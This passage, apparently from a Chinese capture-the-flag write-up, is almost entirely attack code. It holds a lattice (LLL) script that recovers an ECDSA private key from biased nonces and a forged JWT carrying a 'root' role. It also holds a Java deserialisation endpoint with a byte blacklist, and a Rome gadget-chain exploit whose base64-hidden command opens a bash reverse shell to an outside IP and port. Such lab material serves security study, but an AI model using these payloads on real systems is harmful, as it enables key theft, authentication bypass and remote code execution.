     b"e8NUGgEIa+k8sSm4ofSbIgMWmEw33rbS1L8lqAKR6iaNYcIuHfiHLMp0wfplCzeKwpZW/QxUj0VEoSWEUvdhkHkJjRieURbg43yWMn3z0A5RluSSEuAsG++RzK7Yoy1nBTsBDpgIlh4OoWxfp9iso8+S7m8x1nBT9cl1ex6rSfEfYTLKtRPmoinnjV59/6g7+VMfiseH54G2G5G4rx5jq5TZk4GzS9xP2XhXzqSgWwKl/ZDPXsYnLOkaHFdMNeeXq1KuxCLwvjf01VdwmzSUFqQk0U0APhWyJA08m1LKRz58AKF18kDs+K3I/maCaFzB21ZpJHLnq2/BbvRfte551N36K6Yf12ffBJ+BTl7oH0fgJjZZaXWPAp+I5/xGKwBA"),
    (b"MEQCIFLxDvFCOOQSNZ2SoBDoUTTz1lFACZ8ngSRP4rVKX0CWAiA/vfXD2AElXmb6Zst7UtmFcrpqiHD1NWVhq8mS1Q7MUQ==",
     b"sO2sRQDGCYV9NykEdkR65Sflmcig5zRHj/h64ciExkLdG/oNlaZ8tI1B0bsav+qubaS+3fQAe60exHQUv7YCQfdYT/3qBNuycaBi3ZIO1eiWXWl6RMRFKb5i6VasVwZCybIm7ojY7HPSqd6676OJJ8pvQJreAi8T4caTyizgI/NanxekmnnUdM7svitep5SQ8tWvxZUQg8gsJqtUAedgMGMD5QyTVchRKoNAiKlhwxgXYkeg5kOOokq4xP+End8bmlDUFSt9+p+6OEJDeHzVNIybPbJ4eB6Qu7yIor6oYBPjn6dJW6mab5PiXnZnZ4ilXeumlAkbcKMl2rorDtXAggk2jhYQrSu3TpnqfDpNgB4R9+TlCuELKCElrqwM6grmZ99OGc/IzunNJU7izTK5bazEbMGSzXoS0GTm/MtwoxQIy9IhD6eovMRWduUjuSy+UiZMjzbtJY9+nOjUfb0G0W+q1u551NBqVqiXnxGnZtDXE8Fl0LFS9uAtZFWa+s0H"),
    (b"MEUCIE4oqeQY5tSbYvL1phltM4hIJLK2fLejy7D3BVgGtrrwAiEAjpN3jiGjAg19/BPH6xNgquI1doPuTPqNAh0TzJnEKO8=",
     b"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"),
    (b"MEQCIDjQ/jMMOHKW+1ajmVyGiped93CeBPIinzJgOt3FEhKYAiBYzbxCX+/79IgG5OQzq12KoVgDwaMEFsnkaChSfDZS5w==",
     b"4wlpou+C7tIo1rmSj+aHNaV6FFeqTUxAOvxoZiG/GwymRZSG2Vc5xudwNRnGowFt1IRpaoZrjm0Slxbv0MKWZGNIUS7B5jCCJn9BTc90x50="),
    (b"MEQCIHYf9M1WhFbcF63h2sTHu824O9DyOBUIbzudFTD2YOxqAiAb9oqq2/h/sgJ+Pk7jn4yhpohfixZLbeRtxcjnDwI0NQ==",
     b"bNtkPT71kQVt1xDpqp9GJR22wBt8IwCk39LcYrgBNDJoMn2EWGJEdNzvUz0tX7O4R9R7xnC/dJMFhguFPnqNNGUTidK3k9PjXjW2Q8z83uyguospnQ8V4eFZZG995qFrjFk941atB7sSvw/tIo1hopZeSzTeIsdQ0mWEAefvc1jHTehQW/dGwVEYYvlJqrU5S0TCZoevmUjcgNFlNusnUHBj4CmqCRJwV336tYNqpu1WInySFT3AUo2gA2D+1+ECgxsBgsgqGW9uevDHiflMbvtj+Z1QW55h3FqhM1Ccs99EMX0EE9HWgN98lx5zpvYvpKgMlVvov/tMb2Rwel933bRm2BglYxlxrTGk40KoXLA7bIuapkojqrsavLTxzshGgR4GyQ/k62d2UhI3Rf7cvdGYxffADb/a2nroZTCDGF++LTLI7/dWZCQ1hgbZuLJC8g1kvVlIYslHKKnr+T/uSiQrq9CQGcFJzySteVo6BHE6TXAb6PPORo7JU/z2TzdRZpDBl4Ph8s+4Ftv0iKmN0FWKQT20Tzek1YJAt9Rv9EIRClon4o2YLyKj9NMQzi1g8Z59cLxBmHU6VEP/HcOIkj2vvsTnOso+uMdmqxBeQP1edOcXeZos2MA6T0POF6rF8ttpPK/oR3ZRhtKLtQ11L/yumNLgmDrQSoNHrucGuySeMpnAjTDkUTpXGvwt+OlClgwFqAN5RbPB2O6QRc42P3fUw0fS0W7PvJwHqlDW4wbLQ0X84MRbMP6ie13Jde7XjnTmHVmuGx70XywDJhYQEw=="),
    (b"MEYCIQCpx+kVw/+1u7YY7H4k0plemLJNpOBJKDvZIuzF+edY3gIhAPJNf7T2fYPjSb5viIOktFgBsNzSMUHfE0aqNIhp2GiG",
     b"RgbUgZ5PUbA+Cv2OnvLrI8X8/sW8r61EJPI/lQYC97pZrMFAw6WhaG5LfC5TpNBFJGbI92fNCVSmf6X15GWL6g=="),
    (b"MEYCIQDaHSk0ts21UkwsKiac7DbnFFof/dXuV/ZasagF3xIzcQIhANYYbymHoAUqQkO7rChnK/G56fvFiPakl6rWJFYE+N0z",
     b"h4RmLMB1rERLmKjKB/ilmA==")
]

rs,ss = [], []
hs = []
for sig,msg in data:
    print(base64.b64decode(sig))
    sig = base64.b64decode(sig)[2:]
    if sig[:2] == b'x02 ':
        rs.append(bytes_to_long(sig[2:2+32]))
        sig = sig[2+32:]
    else:
        rs.append(bytes_to_long(sig[2:2 + 33]))
        sig = sig[2 + 33:]
    assert 32<=len(sig[2:])<=33
    ss.append(bytes_to_long(sig[2:]))

    # hs.append(bytes_to_long(sha256(base64.b64decode(msg)).digest()))
    hs.append(bytes_to_long(sha256(msg).digest()))

    print()

n = 7

r0 = rs[0]
s0 = ss[0]
h0 = hs[0]
q = N

BB = 1716708884867 * 2
M = Matrix(QQ, n+2,n+2)
for i in range(n):
    M[i,i] = q
    M[-2, i] = rs[i] * inverse_mod(ss[i],q) % q
    M[-1, i] = hs[i] * inverse_mod(ss[i],q) % q
M[-2,-2] = BB / q
M[-1,-1] = BB

L = M.LLL()
print(L[0])
print(L[1])

ks = L[1][:-2]
k0 = ks[0]
x = (k0*s0-h0) * inverse_mod(r0,q)%q

for i in range(n):
    assert ks[i]*ss[i]% q == (hs[i] + rs[i]*x)%q

print(x)

# 39313219724394204510065149548180909443668279642741674773372964155008434357587
authToken=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiIyIiwic3ViIjoiMiIsImlhdCI6MTcxNjY5NTM5OSwicm9sZXMiOiJyb290IiwiZXhwIjoxNzE2Njk4OTk5fQ.w8JBgfsiVEBluG9pyNjc1_uTcnJNUVxylUoeFbuob1g
@RestController
public class Jsrc {
  @PostMapping({"/Jsrc"})
  public String jsrc(@RequestParam(name = "data", required = false) String data, Model model) throws Exception {
    try {
      byte[] decode = Base64.getDecoder().decode(data.replaceAll(" +", "+"));
      InputStream inputStream = new ByteArrayInputStream(decode);
      MyObjectInputStream myObjectInputStream = new MyObjectInputStream(inputStream);
      ByteCompare byteCompare = new ByteCompare();
      byteCompare.Compared(decode);
      myObjectInputStream.readObject();
    } catch (Exception var6) {
      var6.printStackTrace();
      model.addAttribute("msg", "data=");
      return var6.toString().replaceAll("java.*: ", "");
    } 
    return "oh, yeah!";
  }
}
public class ByteCompare {
  private static final ArrayList blacklist = (ArrayList)new ArrayList<>();
  
  String[] s = new String[] { "java.util.HashMap", "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl", "com.alibaba.fastjson.JSONArrayLlist" };
  
  public ByteCompare() {
    blacklist.add(this.s[0].getBytes());
    blacklist.add(this.s[1].getBytes());
    blacklist.add(this.s[2].getBytes());
  }
  
  public void Compared(byte[] OriginData) {
    for (int k = 0; k < 3; k++) {
      for (int i = 0; i < OriginData.length - ((byte[])blacklist.get(k)).length + 1; i++) {
        boolean found = true;
        for (int j = 0; j < ((byte[])blacklist.get(k)).length; j++) {
          if (OriginData[i + j] != ((byte[])blacklist.get(k))[j]) {
            found = false;
            break;
          } 
        } 
        if (found)
          throw new NullPointerException("Don't hacker!"); 
      } 
    } 
  }
}
import com.sun.syndication.feed.impl.EqualsBean;
import util.CustomObjectOutputStream;
import util.createTemplatesImpl;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.Base64;
import java.util.HashMap;

public class Rome2 {
    public static void main(String[] args) throws Exception {
        //依然使用TemplatesImpl来执行命令
        Templates templates = createTemplatesImpl.makeTemplatesImpl("bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjEuNS4yMzguNTIvMzA2NjAgMD4mMQ==}|{base64,-d}|{bash,-i}");

        EqualsBean bean = new EqualsBean(String.class,"");
        HashMap map1 = new HashMap();
        HashMap map2 = new HashMap();
        map1.put("aa",templates);
        map1.put("bB",bean);
        map2.put("aa",bean);
        map2.put("bB",templates);
        HashMap map = new HashMap();
        map.put(map1,"");
        map.put(map2,"");

        Field beanClass = bean.getClass().getDeclaredField("_beanClass");
        beanClass.setAccessible(true);
        beanClass.set(bean, Templates.class);

        Field obj = bean.getClass().getDeclaredField("_obj");
        obj.setAccessible(true);
        obj.set(bean, templates);

        serialize(map);
        unserialize("ser.bin");
    }
    public static String serialize(Object o) throws Exception {
//        ObjectOutputStream p = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        CustomObjectOutputStream  p = new CustomObjectOutputStream(new FileOutputStream("ser.bin"));
        p.writeObject(o);
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        CustomObjectOutputStream  oos = new CustomObjectOutputStream (baos);
        oos.writeObject(o);
        oos.close();

        String base64String = Base64.getEncoder().encodeToString(baos.toByteArray());
        System.out.println(base64String);
        System.out.println(base64String.length());
        return base64String;
    }
    public static Object unserialize(String filename) throws  Exception{
        ObjectInputStream p = new ObjectInputStream(new FileInputStream(filename));
        Object o = p.readObject();
        return o;
    }
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/10-1716943298.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/4-1716943300.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2024/05/7-1716943301.jpeg)